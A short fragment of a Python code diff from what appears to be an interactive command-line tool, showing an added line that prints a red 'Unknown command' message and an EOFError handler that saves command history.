+                    print(f"{Fore.RED}[-] Unknown command: {act}. Type 'help' for usage.{Fore.WHITE}")
 
             except EOFError:
                 self._save_history()
